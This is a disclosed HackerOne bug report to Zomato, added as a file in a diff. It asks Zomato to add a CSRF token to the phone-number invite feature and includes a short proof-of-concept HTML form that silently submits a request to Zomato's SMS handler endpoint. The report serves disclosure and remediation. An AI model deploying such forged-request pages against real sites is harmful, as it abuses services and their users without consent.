@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/113865
+WeaknessName:Violation of Secure Design Principles
+Reporter:https://hackerone.com/kiraak-boy
+ReportedTo:Zomato(zomato)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:14.09.2016 15:10:19
+
+Summary:
+
+Hello,
+
+Please Add CSRF Token While Inviting The User Though Phone Number , You Have Good Rate Limit Protection But At The Same Time Add CSRF TOKEN :-
+
+CODE :-
+
+<html>
+<body>
+<form action="https://www.zomato.com/php/restaurantSmsHandler">
+<input type="hidden" name="type" value="zomato&#45;app&#45;details" />
+<input type="hidden" name="mobile&#95;no" value="xxxxxxxxxxxxxx" />
+<input type="submit" value="Submit request" />
+</form>
+</body>
+</html>
+
+Thanks!
